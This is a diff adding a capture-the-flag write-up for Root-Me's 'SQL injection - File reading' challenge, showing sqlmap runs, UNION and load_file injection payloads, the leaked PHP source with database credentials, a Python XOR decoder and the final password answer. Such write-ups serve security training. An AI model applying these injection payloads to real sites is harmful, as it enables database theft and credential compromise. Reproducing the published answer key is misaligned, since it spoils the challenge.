@@ -68,7 +68,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 60. [PHP - Unserialize overflow](#php-unserialize-overflow)
 61. [SQL injection - Error](#sql-injection-error) 🗸
 62. [SQL injection - Insert](#sql-injection-insert)
-63. [SQL injection - File reading](#sql-injection-file-reading)
+63. [SQL injection - File reading](#sql-injection-file-reading) 🗸
 64. [XPath injection - String](#xpath-injection-string)
 65. [NoSQL injection - Blind](#nosql-injection-blind)
 66. [SQL injection - Time based](#sql-injection-time-based)
@@ -3712,6 +3712,266 @@ Table: m3mbr35t4bl3
 
 ~~~
 1a2BdKT5DIx3qxQN3UaC
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## SQL injection File Reading
+
+- Author: Arod
+- Date: 19 October 2014
+- Points: 40
+- Level: 3
+
+### Statement
+
+Retrieve Administrators Password.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch31/).
+
+### Resources
+
+1. [Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website we find three webpages:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch34/?action=login
+http://challenge01.root-me.org/web-serveur/ch31/?action=members
+http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1
+~~~
+
+Using SQLmap we can automate the injection process:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --batch --banner
+...
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 9303=9303
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 5244 FROM(SELECT COUNT(*),CONCAT(0x716a6b7871,(SELECT (ELT(5244=5244,1))),0x71717a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=members&id=1 AND (SELECT 9404 FROM (SELECT(SLEEP(5)))gnav)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8352 UNION ALL SELECT CONCAT(0x716a6b7871,0x4d6f6765754b4a6c7a774847626877617a4952435245655278496e6667444d414e70415a50554e53,0x71717a6271),NULL,NULL,NULL-- -
+---
+~~~
+
+This first batch command identifies the injection vulnerability.  We can delve deeper into the database using the -dbs flag:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --batch --dbs
+...
+available databases [3]:                                                                                                                                                                                                                     
+[*] c_webserveur_31
+[*] information_schema
+[*] test
+...
+~~~
+
+We can interrogate the c_webserveur_31 database:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --batch --tables -D c_webserveur_31
+...
+Database: c_webserveur_31
+[1 table]
++--------+
+| member |
++--------+
+...
+~~~
+
+Finally, dumping the table we can get the user details including a hashed admin password:
+
+~~~shell
+$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --batch --dump -T member -D c_webserveur_31
+...
+Database: c_webserveur_31
+Table: member
+[1 entry]
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+| member_id | member_email                  | member_login | member_password                                          |
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+| 1         | admin@super-secure-webapp.org | admin        | VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== |
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+~~~
+
+This base64 hash needs deciphering with a key.  We can find the index.php source code by visiting URL:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1%20AND%201=2%20UNION%20ALL%20SELECT%201,2,3,load_file%280x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870%29--
+~~~
+
+This provides:
+
+~~~html
+<html>
+<header><title>SQL injection - FILE</title></header>
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+<h3><a href="?action=login">Authentication</a>&nbsp;|&nbsp;<a href="?action=members">Members</a></h3><hr />
+
+ID : 1<br />Username : 2<br />Email : <html>
+<header><title>SQL injection - FILE</title></header>
+<body>
+<h3><a href="?action=login">Authentication</a>&nbsp;|&nbsp;<a href="?action=members">Members</a></h3><hr />
+
+<?php
+
+define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
+define('SQL_DB',        'c_webserveur_31');
+define('SQL_LOGIN',     'c_webserveur_31');
+define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');
+
+
+function stringxor($o1, $o2) {
+    $res = '';
+    for($i=0;$i<strlen($o1);$i++)
+        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
+    return $res;
+}
+
+$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
+ 
+
+$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
+mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");
+
+if ( ! isset($_GET['action']) ) $_GET['action']="login";
+
+if($_GET['action'] == "login"){
+        print '<form METHOD="POST">
+                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
+                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
+                <p><input value=submit type=submit /></p>
+                </form>';
+
+	if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
+	{
+		$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
+		$pass = sha1($_POST['password']);
+		
+		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
+		if(mysqli_num_rows($result) == 1)
+		{
+			$data = mysqli_fetch_array($result);
+			if($pass == stringxor($key, base64_decode($data['member_password']))){
+                                // authentication success
+                                print "<p>Authentication success !!</p>";
+                                if ($user == "admin")
+                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
+                                else 
+                                    print "<p>But... you're not admin !</p>";
+			}
+			else{
+                                // authentication failed
+				print "<p>Authentication failed !</p>";
+			}
+		}
+		else{
+			print "<p>User not found !</p>";
+		}
+	}
+}
+
+if($_GET['action'] == "members"){
+	if(isset($_GET['id']) && !empty($_GET['id']))
+	{
+                // secure ID variable
+		$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
+		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
+		
+		if(mysqli_num_rows($result) == 1)
+		{
+			$data = mysqli_fetch_array($result);
+			print "ID : ".$data["member_id"]."<br />";
+			print "Username : ".$data["member_login"]."<br />";
+			print "Email : ".$data["member_email"]."<br />";	
+		}
+                else{
+                        print "no result found";
+                }
+	}
+	else{
+		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
+		while ($row = mysqli_fetch_assoc($result)) {
+			print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
+		}
+	}
+}
+
+?>
+</body>
+</html>
+
+<br /></body>
+</html>
+~~~
+	
+This gives the key:
+	
+~~~
+$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
+~~~
+
+We can recover the password in python:
+	
+~~~py
+import base64 as b64
+
+k_asc = "c92fcd618967933ac463feb85ba00d5a7ae52842"
+p_b64 = "VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=="
+p_byt = b64.b64decode(p_b64)
+k_byt = k_asc.encode()
+
+p_asc = ""
+
+for i in range(len(k_byt)):
+    p_asc += chr(k_byt[i]^p_byt[i])
+    
+print("Password = {}".format(p_asc))
+~~~
+
+This returns the password 77be4fc97f77f5f48308942bb6e32aacabed9cef.  This is a hash.  Using the [md5hashing](https://md5hashing.net) online tool, we can unhash this to reveal the password is "superpassword" hashed using SHA1.  We can login to test with the following parameters:
+	
+~~~
+username = admin
+password = superpassword
+~~~
+	
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+superpassword
 ~~~
 
 </details>
